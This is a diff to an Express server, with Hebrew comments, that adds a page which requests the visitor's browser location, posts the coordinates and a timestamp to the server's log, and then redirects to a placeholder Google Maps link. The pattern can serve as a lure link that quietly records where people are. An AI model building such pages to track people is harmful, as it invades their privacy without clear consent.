@@ -87,46 +87,68 @@ app.post('/report', (req, res) => {
         });
 });
 
-// יצירת API Endpoint שמקבל את המיקום
-app.post('/receive-location', (req, res) => {
-    const { latitude, longitude } = req.body;
-  
-    // לבדוק אם התקבל המיקום
-    if (!latitude || !longitude) {
-      return res.status(400).send({ error: 'Location not provided' });
-    }
-  
-    // לוג של המיקום
-    console.log(`Received location: Latitude: ${latitude}, Longitude: ${longitude}`);
-  
-    // יצירת קישור ל-Google Maps
-    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    
-    // לוג של פתיחת הקישור
-    console.log(`Redirecting to Google Maps: ${googleMapsUrl}`);
-  
-    // יצירת תוכן ה-HTML שיבוצע רידיירקט
+app.get('/receive-location', (req, res) => {
     const htmlContent = `
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-          <meta charset="UTF-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>Redirecting to Google Maps</title>
-      </head>
-      <body>
-          <h1>Redirecting to Google Maps...</h1>
-          <script>
-              // מבצע רידיירקט ל-Google Maps
-              window.location.href = "${googleMapsUrl}";
-          </script>
-      </body>
-      </html>
+        <!DOCTYPE html>
+        <html lang="he">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>מיקום נשלח בהצלחה</title>
+        </head>
+        <body>
+            <script>
+                // בקשת המיקום הנוכחי מהדפדפן
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // שליחת המיקום ב-POST לשרת
+                        fetch('/reportLocation', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude: latitude,
+                                longitude: longitude,
+                                timestamp: new Date().toISOString()
+                            })
+                        })
+                        .catch(error => {
+                            console.error('Error reporting location:', error);
+                        });
+
+                        // ביצוע רידיירקט לאפליקציה או אתר אחר
+                        window.location.href = 'https://maps.app.goo.gl/CbUb2RehYNPCqs2aA';  // שנה לכתובת שלך
+                    });
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                }
+            </script>
+        </body>
+        </html>
     `;
-  
-    // שליחה של ה-HTML ללקוח
+
     res.send(htmlContent);
-  });
+});
+
+app.post('/reportLocation', (req, res) => {
+    const { latitude, longitude, timestamp } = req.body;
+
+    // בדוק אם כל הפרמטרים התקבלו
+    if (!latitude || !longitude || !timestamp) {
+        return res.status(400).send('Missing location or timestamp');
+    }
+
+    // לוג של המיקום
+    console.log(`Received location: Latitude: ${latitude}, Longitude: ${longitude}, Timestamp: ${timestamp}`);
+
+    // אפשר להוסיף פעולות נוספות עם המיקום, כמו שמירה בבסיס נתונים
+
+    res.status(200).send('Location received');
+});
+
+
 // הפעלת השרת
 app.listen(PORT, () => {
     console.log(`Server is running on http://localhost:${PORT}`);
